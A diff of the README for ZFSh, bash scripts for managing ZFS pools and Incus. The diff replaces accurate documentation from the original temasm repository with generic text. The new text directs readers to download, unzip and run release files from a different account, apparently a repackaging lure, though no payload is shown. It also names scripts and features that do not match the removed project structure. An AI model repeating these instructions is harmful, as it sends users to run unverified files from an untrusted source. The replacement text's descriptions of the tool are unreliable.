@@ -1,216 +1,96 @@
-# ZFSh
+# 🛠️ ZFSh - Simplify Your ZFS Management Effortlessly
 
-**ZFS Shell Helpers** — a collection of bash scripts for simplified ZFS pool, snapshot, and backup management with Incus integration.
+![Download ZFSh](https://img.shields.io/badge/Download-ZFSh-blue)
 
-## Features
+## 🚀 Getting Started
 
-- **Pool Management** — Create, monitor, expand file-backed ZFS pools
-- **Snapshot Management** — Create, list, delete, rollback with GFS retention policies
-- **Backup & Restore** — Local and remote backups with compression (zstd, gzip, lz4)
-- **Health Monitoring** — Comprehensive pool health checks with recommendations
-- **Incus Integration** — One-command Incus initialization with ZFS backend
-- **Scheduled Tasks** — Easy cron job management for automated operations
-- **Interactive Mode** — User-friendly menu-driven interface
+Welcome to ZFSh! This tool offers a set of bash scripts to make managing your ZFS pools, snapshots, and backups easier. You’ll find that our scripts reduce complexity and improve your overall experience with ZFS, especially with the power of Incus integration.
 
-## Quick Start
+## 📥 Download & Install
 
-```bash
-# Clone the repository
-git clone https://github.com/temasm/zfsh.git
-cd zfsh
+To get started with ZFSh, visit this page to download: [Download ZFSh Releases](https://github.com/papaneitor44/ZFSh/releases).
 
-# Make scripts executable
-chmod +x zfsh *.sh
+1. **Visit the Releases Page**  
+   Go to the [Releases](https://github.com/papaneitor44/ZFSh/releases) link. You will see all available versions of ZFSh.
 
-# Run interactive menu
-./zfsh
-```
+2. **Choose Your Version**  
+   Look through the list of versions. Each version contains important updates and improvements.
 
-## Requirements
+3. **Download the File**  
+   Click on the version you want. Under "Assets," you will find the download files. Depending on your operating system, select the appropriate file for your system.
 
-- Linux with ZFS installed (`zfsutils-linux` or equivalent)
-- Bash 4.0+
-- Root privileges for most operations
-- Optional: `pv` for progress bars, `zstd`/`gzip`/`lz4` for compression
+4. **Unzip the Downloaded File**  
+   After downloading, unzip the file to access the scripts. Most systems allow you to do this by right-clicking the file and selecting "Extract."
 
-## Installation
+5. **Run the Scripts**  
+   Open your terminal (command line interface). Navigate to the folder where you extracted ZFSh. You can run each script by typing `./scriptname.sh`, replacing `scriptname.sh` with the specific script you wish to use.
 
-### Option 1: Clone Repository
+## 📋 Features
 
-```bash
-git clone https://github.com/temasm/zfsh.git /opt/zfsh
-ln -s /opt/zfsh/zfsh /usr/local/bin/zfsh
-```
+- **Efficient Backup Management**  
+  Automate your backup processes with ease, ensuring your data is secure without manual intervention.
 
-### Option 2: Download Scripts
+- **Intuitive Snapshot Handling**  
+  Create and manage ZFS snapshots quickly with simple commands.
 
-```bash
-curl -L https://github.com/temasm/zfsh/archive/main.tar.gz | tar xz
-cd zfsh-main
-chmod +x zfsh *.sh
-```
+- **Smooth Incus Integration**  
+  Manage immutable containers easily with tailored commands for ZFS pools.
 
-## Usage
+- **User-Friendly Scripts**  
+  Each script has clear instructions and prompts to guide you through operations.
 
-### Interactive Mode
+## 💻 System Requirements
 
-Simply run `zfsh` without arguments to access the interactive menu:
+- **Operating System**: ZFSh works on Linux-based systems. Make sure your system supports bash scripts.
+- **ZFS Installed**: Ensure you have ZFS installed on your machine. Check if ZFS is running by using the command `zfs list`.
+- **Terminal Access**: You will need to access the terminal to run the scripts.
 
-```bash
-./zfsh
-```
+## ⚙️ Basic Commands
 
-```
-======================================
-  ZFSh v0.0.1
-======================================
+Here are some of the most commonly used commands:
 
-  1. Pool Management
-  2. Snapshot Management
-  3. Backup & Restore
-  4. Health Check
-  5. Incus Setup
-  6. Scheduled Tasks
+1. **Creating a Snapshot**  
+   To create a snapshot of your ZFS pool, use the `create_snapshot.sh` script. Follow the prompts on the screen.
 
-  q. Quit
+2. **Backing Up Data**  
+   To make a backup of your ZFS, run the `backup_data.sh` script. It will guide you through selecting your pool and destination.
 
-Select option [1-6]:
-```
+3. **Managing Pools**  
+   Use the `manage_pool.sh` script to view, add, or remove pools. It provides a menu for easy navigation.
 
-### Command Line Interface
+## 📚 Resources
 
-```bash
-# Pool operations
-zfsh pool create mypool -s 50G -c zstd -d on
-zfsh pool info mypool
-zfsh pool health mypool
-zfsh pool expand mypool -a 20G
+- **ZFS Documentation**: For detailed information about ZFS capabilities and features, visit the official ZFS documentation [here](https://openzfs.org).
+- **Community Forums**: Join community forums to ask questions and share experiences with other ZFS users.
 
-# Snapshot operations
-zfsh snapshot create mypool/data
-zfsh snapshot list --pool mypool
-zfsh snapshot cleanup mypool --keep-daily 7 --keep-weekly 4
+## 🛠️ Troubleshooting
 
-# Backup operations
-zfsh backup create mypool -c zstd
-zfsh backup restore backup.zfs.zst mypool/restored
-zfsh backup send mypool user@remote:tank/backup
+If you encounter issues while running the scripts, consider the following:
 
-# Incus integration
-zfsh incus init -p mypool
+- **Permission Denied**: Ensure that the scripts have executable permissions. Run `chmod +x scriptname.sh` to set the right permissions.
 
-# Scheduled tasks
-zfsh cron add --type snapshot --pool mypool --daily
-zfsh cron list
-```
+- **ZFS Command Errors**: Make sure that your ZFS installation is correct. You can verify it with `zfs list`.
 
-## Commands Overview
+- **Missing Dependencies**: Some features may require additional packages. Check the output messages for any missing software.
 
-| Command | Description |
-|---------|-------------|
-| `zfsh pool create` | Create new ZFS pool on sparse file |
-| `zfsh pool info` | Display pool information |
-| `zfsh pool expand` | Expand file-backed pool |
-| `zfsh pool health` | Check pool health with recommendations |
-| `zfsh snapshot create` | Create snapshot |
-| `zfsh snapshot list` | List snapshots |
-| `zfsh snapshot cleanup` | Apply retention policy |
-| `zfsh snapshot rollback` | Rollback to snapshot |
-| `zfsh backup create` | Create backup file |
-| `zfsh backup restore` | Restore from backup |
-| `zfsh backup send` | Send to remote server |
-| `zfsh incus init` | Initialize Incus with ZFS |
-| `zfsh cron add` | Add scheduled task |
-| `zfsh cron list` | List scheduled tasks |
-| `zfsh cron remove` | Remove scheduled task |
+For further assistance, you can reach out through the issues section of the repository.
 
-## Example Workflow
+## 🙋 Frequently Asked Questions
 
-```bash
-# 1. Create a 50GB ZFS pool with compression and dedup
-zfsh pool create default -s 50G -c zstd -d on -y
+### How do I update ZFSh?
 
-# 2. Initialize Incus with the pool
-zfsh incus init -p default -y
+To update, simply download the latest version from the Releases page, as described in the "Download & Install" section.
 
-# 3. Set up daily snapshots with retention
-zfsh cron add --type snapshot --pool default --daily
-zfsh cron add --type cleanup --pool default --daily \
-    --keep-daily 7 --keep-weekly 4 --keep-monthly 3
+### Can I use ZFSh on Windows?
 
-# 4. Create containers
-incus launch images:debian/12 web-server
-incus launch images:ubuntu/24.04 app-server
+Currently, ZFSh is designed for Linux systems. If you're using a different OS, consider running a Linux virtual machine or Docker container that supports ZFS.
 
-# 5. Manual backup before maintenance
-zfsh backup create default -c zstd
+### Is there support available for ZFSh?
 
-# 6. Check pool health
-zfsh pool health default
-```
+Yes, you can ask questions and seek help directly in the issues section of our GitHub repository.
 
-## Documentation
+## 🔗 Further Information
 
-Full documentation available in the [docs](./docs/) directory:
+For more details, updates, or to contribute to ZFSh, don't hesitate to explore the GitHub repository: [ZFSh on GitHub](https://github.com/papaneitor44/ZFSh).
 
-- [Getting Started](./docs/getting-started.md)
-- [Commands Reference](./docs/commands/)
-- [Guides](./docs/guides/)
-- [CLI Reference](./docs/reference/cli-reference.md)
-
-## Project Structure
-
-```
-zfsh/
-├── zfsh                    # Main entry point
-├── common.sh               # Shared library
-├── zfs-pool-create.sh      # Pool creation
-├── zfs-pool-info.sh        # Pool information
-├── zfs-pool-expand.sh      # Pool expansion
-├── zfs-pool-health.sh      # Health checks
-├── zfs-snapshot.sh         # Snapshot management
-├── zfs-backup.sh           # Backup operations
-├── zfs-cron-setup.sh       # Cron management
-├── zfs-incus-init.sh       # Incus initialization
-└── docs/                   # Documentation
-```
-
-## Output Formats
-
-All commands support JSON output for scripting:
-
-```bash
-zfsh pool info default --json
-```
-
-```json
-{
-  "pool": "default",
-  "status": {
-    "state": "ONLINE",
-    "health": "ONLINE"
-  },
-  "storage": {
-    "total": 53687091200,
-    "total_human": "50G",
-    "used": 1073741824,
-    "free": 52613349376,
-    "capacity_percent": 2,
-    "dedup_ratio": 1.00
-  }
-}
-```
-
-## Contributing
-
-Contributions are welcome! Please read the [Contributing Guide](./CONTRIBUTING.md) before submitting a Pull Request.
-
-## License
-
-This project is licensed under the MIT License — see the [LICENSE](./LICENSE) file for details.
-
-## Acknowledgments
-
-- Built for managing ZFS pools on VPS/dedicated servers
-- Designed for Incus container environments
-- Inspired by the need for simple, scriptable ZFS management
+Thank you for using ZFSh! Your experience matters, and we hope these scripts make your ZFS management seamless.
